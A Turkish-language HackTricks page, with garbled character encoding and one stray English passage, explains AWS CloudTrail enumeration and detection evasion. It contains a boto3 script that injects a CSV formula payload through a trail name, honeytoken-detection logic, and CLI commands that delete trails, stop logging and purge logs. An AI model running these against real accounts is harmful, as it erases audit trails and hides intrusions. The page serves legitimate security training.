# AWS - CloudTrail Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± takip edin.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github reposuna katkÄ±da bulunun.

</details>

## **CloudTrail**

AWS CloudTrail, AWS ortamÄ±nÄ±zda gerÃ§ekleÅŸen etkinlikleri **kaydedip izler**. AWS kaynaklarÄ±yla gerÃ§ekleÅŸtirilen tÃ¼m etkileÅŸimler iÃ§in kimin ne yaptÄ±ÄŸÄ±nÄ±, ne zaman yaptÄ±ÄŸÄ±nÄ± ve nereden yaptÄ±ÄŸÄ±nÄ± iÃ§eren ayrÄ±ntÄ±lÄ± **etkinlik gÃ¼nlÃ¼klerini** yakalar. Bu, deÄŸiÅŸikliklerin ve eylemlerin denetim izini, gÃ¼venlik analizi, uyumluluk denetimi ve kaynak deÄŸiÅŸiklik izleme iÃ§in yardÄ±mcÄ± olur. CloudTrail, kullanÄ±cÄ± ve kaynak davranÄ±ÅŸÄ±nÄ± anlamak, gÃ¼venlik durumlarÄ±nÄ± geliÅŸtirmek ve dÃ¼zenleyici uyumluluÄŸu saÄŸlamak iÃ§in Ã¶nemlidir.

Her kaydedilen etkinlik aÅŸaÄŸÄ±dakileri iÃ§erir:

* Ã‡aÄŸrÄ±lan API'nin adÄ±: `eventName`
* Ã‡aÄŸrÄ±lan hizmet: `eventSource`
* Zaman: `eventTime`
* IP adresi: `SourceIPAddress`
* Ajan yÃ¶ntemi: `userAgent`. Ã–rnekler:
* Signing.amazonaws.com - AWS YÃ¶netim Konsolu'ndan
* console.amazonaws.com - HesabÄ±n kÃ¶k kullanÄ±cÄ±sÄ±
* lambda.amazonaws.com - AWS Lambda
* Ä°stek parametreleri: `requestParameters`
* YanÄ±t Ã¶ÄŸeleri: `responseElements`

Etkinlikler, yaklaÅŸÄ±k olarak her 5 dakikada bir JSON dosyasÄ±nda yeni bir gÃ¼nlÃ¼k dosyasÄ±na yazÄ±lÄ±r, CloudTrail tarafÄ±ndan tutulur ve sonunda gÃ¼nlÃ¼k dosyalarÄ± yaklaÅŸÄ±k 15 dakika sonra S3'e **teslim edilir**.\
CloudTrail gÃ¼nlÃ¼kleri, hesaplar ve bÃ¶lgeler arasÄ±nda **birleÅŸtirilebilir**.\
CloudTrail, size teslim edildikten sonra gÃ¼nlÃ¼k dosyalarÄ±nÄ±zÄ±n deÄŸiÅŸmediÄŸini doÄŸrulamak iÃ§in **gÃ¼nlÃ¼k dosyasÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kullanmanÄ±za olanak saÄŸlar**. GÃ¼nlÃ¼klerin iÃ§indeki bir Ã¶zet dosyasÄ±nÄ±n SHA-256 karma deÄŸeri oluÅŸturur. Yeni gÃ¼nlÃ¼klerin SHA-256 karma deÄŸeri her saat baÅŸÄ± oluÅŸturulur.\
Bir Trail oluÅŸtururken etkinlik seÃ§icileri, kaydedilecek izi belirtmenize olanak tanÄ±r: YÃ¶netim, veri veya iÃ§gÃ¶rÃ¼ etkinlikleri.

GÃ¼nlÃ¼kler bir S3 kovasÄ±nda saklanÄ±r. VarsayÄ±lan olarak Sunucu TarafÄ± Åifreleme (SSE-S3) kullanÄ±lÄ±r, bu nedenle AWS, iÃ§eriÄŸi eriÅŸimi olan kiÅŸiler iÃ§in ÅŸifresini Ã§Ã¶zer, ancak ek gÃ¼venlik iÃ§in KMS ile SSE kullanabilir ve kendi anahtarlarÄ±nÄ±zÄ± kullanabilirsiniz.

GÃ¼nlÃ¼kler, aÅŸaÄŸÄ±daki ad biÃ§imine sahip bir **S3 kovasÄ±nda saklanÄ±r**:

* **`BucketAdÄ±/AWSLogs/HesapID/CloudTrail/BÃ¶lgeAdÄ±/YYY/AA/GG`**
* BucketAdÄ±: **`aws-cloudtrail-logs-<hesapID>-<rastgele>`**
* Ã–rnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasÃ¶rÃ¼n iÃ§indeki her gÃ¼nlÃ¼ÄŸÃ¼n bir **adÄ± bu formatta** olacaktÄ±r: **`HesapID_CloudTrail_BÃ¶lgeAdÄ±_YYYYAAGGTSSSZ_Rastgele.json.gz`**

GÃ¼nlÃ¼k DosyasÄ± AdlandÄ±rma KuralÄ±

![](<../../../../.gitbook/assets/image (29).png>)

AyrÄ±ca, **dosya bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol etmek iÃ§in (Ã¶zet dosyalarÄ±)** aynÄ± kovada olacak:

![](<../../../../.gitbook/assets/image (22).png>)

### Birden Fazla Hesaptan GÃ¼nlÃ¼kleri BirleÅŸtirme

* GÃ¼nlÃ¼k dosyalarÄ±nÄ±n teslim edileceÄŸi AWS hesabÄ±nda bir Deneme oluÅŸturun
* CloudTrail iÃ§in Ã§apraz hesap eriÅŸimine izin vermek iÃ§in hedef S3 kovasÄ±na izinleri uygulayÄ±n ve eriÅŸime ihtiyaÃ§ duyan her AWS hesabÄ±na izin verin
* DiÄŸer AWS hesaplarÄ±nda yeni bir Trail oluÅŸturun ve 1. adÄ±mda oluÅŸturulan kovayÄ± kullanmayÄ± seÃ§in

Ancak, aynÄ± S3 kovasÄ±na tÃ¼m gÃ¼nlÃ¼kleri kaydedebilirsiniz, ancak birden fazla hesaptan gelen CloudTrail gÃ¼nlÃ¼klerini tek bir AWS hesabÄ±na ait bir CloudWatch GÃ¼nlÃ¼klerine birleÅŸtiremezsiniz.

{% hint style="danger" %}
Bir hesap, aynÄ± (veya farklÄ±) gÃ¼nlÃ¼kleri farklÄ± kovalarda saklayan CloudTrail'den **farklÄ± Trails**a sahip olabilir.
{% endhint %}

### TÃ¼m org hesaplarÄ±ndan Cloudtrail'Ä± 1'e

CloudTrail oluÅŸtururken, orgdaki tÃ¼m hesaplar iÃ§in cloudtrail'Ä± etkinleÅŸtirmek ve gÃ¼nlÃ¼kleri yalnÄ±zca 1 kovada almak mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Bu ÅŸekilde, tÃ¼m hesaplarÄ±n tÃ¼m bÃ¶lgelerinde CloudTrail'Ä± kolayca yapÄ±landÄ±rabilir ve gÃ¼nlÃ¼kleri 1 hesapta (korumanÄ±z gereken hesap) merkezileÅŸtirebilirsiniz.

### GÃ¼nlÃ¼k DosyalarÄ±nÄ± Kontrol Etme

GÃ¼nlÃ¼klerin deÄŸiÅŸtirilmediÄŸini kontrol etmek iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rabilirsiniz:

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatch'a GÃ¼nlÃ¼kler

**CloudTrail, ÅŸÃ¼pheli faaliyetler gerÃ§ekleÅŸtirildiÄŸinde sizi uyaracak olan bir uyarÄ± ayarlayabilmeniz iÃ§in gÃ¼nlÃ¼kleri otomatik olarak CloudWatch'a gÃ¶nderebilir.**\
CloudTrail'Ä±n gÃ¼nlÃ¼kleri CloudWatch'a gÃ¶ndermesine izin vermek iÃ§in bir **rol** oluÅŸturulmasÄ± gerekmektedir. MÃ¼mkÃ¼nse, bu iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in AWS varsayÄ±lan rolÃ¼nÃ¼ kullanmanÄ±z Ã¶nerilir. Bu rol, CloudTrail'in aÅŸaÄŸÄ±daki iÅŸlemleri gerÃ§ekleÅŸtirmesine izin verecektir:

* CreateLogStream: CloudWatch GÃ¼nlÃ¼kleri gÃ¼nlÃ¼k akÄ±ÅŸÄ± oluÅŸturmayÄ± saÄŸlar
* PutLogEvents: CloudTrail gÃ¼nlÃ¼klerini CloudWatch GÃ¼nlÃ¼kleri gÃ¼nlÃ¼k akÄ±ÅŸÄ±na iletmeyi saÄŸlar

### Olay GeÃ§miÅŸi

CloudTrail Olay GeÃ§miÅŸi, kaydedilen gÃ¼nlÃ¼kleri bir tabloda incelemenizi saÄŸlar:

![](<../../../../.gitbook/assets/image (24).png>)

### Ä°ncelemeler

**CloudTrail Ä°ncelemeleri**, CloudTrail izlerinden yazma yÃ¶netimi olaylarÄ±nÄ± otomatik olarak **analiz eder** ve **olaÄŸandÄ±ÅŸÄ± faaliyetleri** size **bildirir**. Ã–rneÄŸin, belirlenen temel Ã§izgilerden farklÄ±lÄ±k gÃ¶steren `TerminateInstance` olaylarÄ±nda bir artÄ±ÅŸ varsa, bunu bir Ä°nceleme olayÄ± olarak gÃ¶receksiniz. Bu olaylar, olaÄŸandÄ±ÅŸÄ± API faaliyetlerini bulmayÄ± ve yanÄ±tlamayÄ± daha kolay hale getirir.

Ä°ncelemeler, CloudTrail gÃ¼nlÃ¼kleriyle aynÄ± kovette saklanÄ±r: `BucketAdÄ±/AWSLogs/HesapID/CloudTrail-Insight`

### GÃ¼venlik

| CloudTrail GÃ¼nlÃ¼k DosyasÄ± BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ | <ul><li>GÃ¼nlÃ¼klerin deÄŸiÅŸtirilip silinip silinmediÄŸini doÄŸrulayÄ±n</li><li><p>Her dosya iÃ§in Ã¶zet dosyalarÄ± kullanÄ±r (her dosya iÃ§in bir karma oluÅŸturur)</p><ul><li>SHA-256 karma iÅŸlemi</li><li>Dijital imza iÃ§in SHA-256 ile RSA</li><li>Amazon tarafÄ±ndan sahip olunan Ã¶zel anahtar</li></ul></li><li>Bir Ã¶zet dosyasÄ± oluÅŸturmak 1 saat sÃ¼rer (her saat baÅŸÄ± yapÄ±lÄ±r)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Yetkisiz eriÅŸimi durdurun           | <ul><li><p>IAM politikalarÄ± ve S3 kova politikalarÄ±nÄ± kullanÄ±n</p><ul><li>gÃ¼venlik ekibi â€”> yÃ¶netici eriÅŸimi</li><li>denetÃ§iler â€”> salt okunur eriÅŸim</li></ul></li><li>GÃ¼nlÃ¼kleri ÅŸifrelemek iÃ§in SSE-S3/SSE-KMS kullanÄ±n</li></ul>                                                                                                                                        |
| GÃ¼nlÃ¼k dosyalarÄ±nÄ±n silinmesini Ã¶nleyin | <ul><li>IAM ve kova politikalarÄ± ile silme eriÅŸimini kÄ±sÄ±tlayÄ±n</li><li>S3 MFA silme yapÄ±landÄ±rmasÄ±</li><li>GÃ¼nlÃ¼k DosyasÄ± DoÄŸrulama ile doÄŸrulayÄ±n</li></ul>                                                                                                                                                                                            |

## EriÅŸim DanÄ±ÅŸmanÄ±

AWS EriÅŸim DanÄ±ÅŸmanÄ±, son 400 gÃ¼nlÃ¼k AWS **CloudTrail gÃ¼nlÃ¼klerine dayanarak bilgilerini toplar**. CloudTrail, bir AWS hesabÄ±nda yapÄ±lan AWS API Ã§aÄŸrÄ±larÄ±nÄ±n ve ilgili olaylarÄ±n bir geÃ§miÅŸini kaydeder. EriÅŸim DanÄ±ÅŸmanÄ±, bu verileri kullanarak bir IAM kullanÄ±cÄ±sÄ±nÄ±n veya rolÃ¼nÃ¼n hangi AWS hizmetlerine eriÅŸtiÄŸini ve bu eriÅŸimin ne zaman gerÃ§ekleÅŸtiÄŸini belirleyebilir. Bu, AWS yÃ¶neticilerinin izinleri geliÅŸtirmeye yÃ¶nelik bilinÃ§li kararlar vermelerine yardÄ±mcÄ± olur, Ã§Ã¼nkÃ¼ uzun sÃ¼re eriÅŸilmemiÅŸ hizmetleri belirleyebilir ve gerÃ§ek kullanÄ±m modellerine dayanarak aÅŸÄ±rÄ± geniÅŸ izinleri azaltabilirler.

{% hint style="success" %}
Bu nedenle, EriÅŸim DanÄ±ÅŸmanÄ±, kullanÄ±cÄ±lara **gereksiz izinlerin verildiÄŸi konusunda bilgi verir**, bÃ¶ylece yÃ¶netici bunlarÄ± kaldÄ±rabilir.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Eylemler

### NumaralandÄ±rma
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Enjeksiyonu**

CloudTrail iÃ§inde CVS enjeksiyonu gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. EÄŸer gÃ¼nlÃ¼kler CSV olarak dÄ±ÅŸa aktarÄ±lÄ±p Excel ile aÃ§Ä±lÄ±rsa, keyfi kod yÃ¼rÃ¼tme gerÃ§ekleÅŸtirilebilir. AÅŸaÄŸÄ±daki kod, payload iÃ§eren hatalÄ± bir Trail adÄ±yla bir gÃ¼nlÃ¼k giriÅŸi oluÅŸturacaktÄ±r:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla CSV Enjeksiyonu hakkÄ±nda bilgi iÃ§in sayfayÄ± kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu Ã¶zel teknik hakkÄ±nda daha fazla bilgi iÃ§in [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) adresini kontrol edin.

## **Tespiti Atlatma**

### HoneyTokens **atlatma**

HoneyTokens, **duyarlÄ± bilgilerin dÄ±ÅŸarÄ±ya Ã§Ä±karÄ±lmasÄ±nÄ± tespit etmek** iÃ§in oluÅŸturulur. AWS durumunda, **izlenen AWS anahtarlarÄ±** oluÅŸturulur, eÄŸer bir anahtarla bir eylem tetiklenirse, o anahtarÄ± Ã§alan biri olmalÄ±dÄ±r.

Ancak, bu izleme **CloudTrail** aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir ve bazÄ± **AWS hizmetleri CloudTrail'e gÃ¼nlÃ¼k gÃ¶ndermez** (listeyi [burada](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) bulabilirsiniz). Bu hizmetlerden bazÄ±larÄ±, yetkisiz bir kiÅŸi (honeytoken anahtarÄ±) eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, **ARN iÃ§eren bir hata** ile yanÄ±t verir.

Bu ÅŸekilde, bir **saldÄ±rgan herhangi bir gÃ¼nlÃ¼ÄŸÃ¼ tetiklemeden anahtarÄ±n ARN'sini elde edebilir**. ARN'de saldÄ±rgan, **AWS hesap kimliÄŸi ve adÄ±nÄ±** gÃ¶rebilir, bu ÅŸekilde bir saldÄ±rgan HoneyToken'Ä±n ÅŸirket hesaplarÄ±nÄ±n kimliklerini ve adlarÄ±nÄ± belirleyebilir.

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens Tespiti**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57), bir anahtarÄ±n [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'a ait olup olmadÄ±ÄŸÄ±nÄ± tespit eder:**

* EÄŸer rol adÄ±nda **`canarytokens.org`** veya hata mesajÄ±nda **`534261010715`** hesap kimliÄŸi gÃ¶rÃ¼nÃ¼yorsa.
* Daha yeni testlerde, **`717712589309`** hesabÄ±nÄ± kullandÄ±klarÄ±nÄ± ve hala adÄ±nda **`canarytokens.com`** dizesinin bulunduÄŸunu tespit ettiler.
* EÄŸer rol adÄ±nda **`SpaceCrab`** veya hata mesajÄ±nda gÃ¶rÃ¼nÃ¼yorsa
* **SpaceSiren**, kullanÄ±cÄ± adlarÄ± oluÅŸturmak iÃ§in **uuid'leri** kullanÄ±r: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* EÄŸer **ad rastgele oluÅŸturulmuÅŸ gibi gÃ¶rÃ¼nÃ¼yorsa**, bÃ¼yÃ¼k olasÄ±lÄ±kla bir HoneyToken'dÄ±r.

{% hint style="danger" %}
Tespit edilen tÃ¼m genel API'lerin artÄ±k CloudTrail gÃ¼nlÃ¼kleri oluÅŸturmadÄ±ÄŸÄ± dÃ¼zeltilmiÅŸtir, bu yÃ¼zden belki kendi API'nizi bulmanÄ±z gerekebilir...

Veya **KodlanmÄ±ÅŸ** iÃ§indeki **eriÅŸim anahtarÄ±ndan** **Hesap KimliÄŸini** alabilirsiniz [**burada aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) ve Honeytokens AWS hesaplarÄ±nÄ±zÄ±n hesap kimliÄŸini kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmayÄ±**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) kontrol edin.

### ÃœÃ§Ã¼ncÃ¼ AltyapÄ±ya EriÅŸim

BazÄ± AWS hizmetleri, **VeritabanlarÄ±** veya **Kubernetes** kÃ¼meleme (EKS) gibi bazÄ± altyapÄ±larÄ± **oluÅŸturur**. Bir kullanÄ±cÄ±, bu hizmetlere (Ã¶rneÄŸin Kubernetes API'si gibi) **doÄŸrudan eriÅŸtiÄŸinde AWS API'sini kullanmaz**, bu nedenle CloudTrail bu iletiÅŸimi gÃ¶remez.

Bu nedenle, EKS'ye eriÅŸimi olan bir kullanÄ±cÄ±, EKS API'sinin URL'sini keÅŸfetmiÅŸse yerel olarak bir belirteÃ§ oluÅŸturabilir ve **CloudTrail tarafÄ±ndan tespit edilmeden doÄŸrudan API hizmetiyle iletiÅŸim kurabilir**.

Daha fazla bilgi iÃ§in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

#### SporlarÄ± Silme
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Trail Durdurma

To stop a CloudTrail trail, you can use the AWS Management Console, AWS CLI, or AWS SDKs. The following steps outline how to stop a trail using the AWS Management Console:

1. Open the AWS Management Console and navigate to the CloudTrail service.
2. In the left navigation pane, click on "Trails".
3. Select the trail that you want to stop.
4. Click on the "Actions" dropdown menu and choose "Stop logging".
5. Confirm the action by clicking on "Stop logging" in the dialog box that appears.

Once the trail is stopped, it will no longer record any API activity in your AWS account.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Ã‡oklu bÃ¶lge kaydÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Olay SeÃ§icileriyle GÃ¼nlÃ¼ÄŸÃ¼ Devre DÄ±ÅŸÄ± BÄ±rakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Ä°lk Ã¶rnekte, tek bir olay seÃ§ici, tek bir nesne olarak JSON dizisi olarak saÄŸlanÄ±r. `"ReadWriteType": "ReadOnly"` ifadesi, olay seÃ§icinin yalnÄ±zca salt okunur olaylarÄ± yakalamasÄ± gerektiÄŸini gÃ¶sterir (bu nedenle CloudTrail iÃ§gÃ¶rÃ¼leri Ã¶rneÄŸin yazma olaylarÄ±nÄ± kontrol etmeyecek).

Olay seÃ§icisini belirli gereksinimlerinize gÃ¶re Ã¶zelleÅŸtirebilirsiniz.

#### S3 yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± aracÄ±lÄ±ÄŸÄ±yla gÃ¼nlÃ¼klerin silinmesi
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Bucket YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

* S3 kovasÄ±nÄ± silin
* Kovaya ait politikayÄ± CloudTrail hizmetinden gelen yazma iÅŸlemlerini reddedecek ÅŸekilde deÄŸiÅŸtirin
* S3 kovasÄ±na nesneleri silmek iÃ§in yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ekleyin
* CloudTrail gÃ¼nlÃ¼klerini ÅŸifrelemek iÃ§in kullanÄ±lan kms anahtarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±n

### Cloudtrail fidye yazÄ±lÄ±mÄ±

#### S3 fidye yazÄ±lÄ±mÄ±

**Asimetrik bir anahtar oluÅŸturabilir** ve **CloudTrail'in verileri** bu anahtarla **ÅŸifrelemesini saÄŸlayabilir** ve ardÄ±ndan **Ã¶zel anahtarÄ± silerek** CloudTrail iÃ§eriÄŸinin kurtarÄ±lamamasÄ±nÄ± saÄŸlayabilirsiniz.\
Bu temel olarak bir **S3-KMS fidye yazÄ±lÄ±mÄ±**'dÄ±r ve aÅŸaÄŸÄ±da aÃ§Ä±klanmÄ±ÅŸtÄ±r:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS fidye yazÄ±lÄ±mÄ±**

Bu, Ã¶nceki saldÄ±rÄ±yÄ± farklÄ± izin gereksinimleriyle gerÃ§ekleÅŸtirmenin daha kolay bir yoludur:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> adlÄ± eÄŸitimle sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE'yi Ã¶ÄŸrenin</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
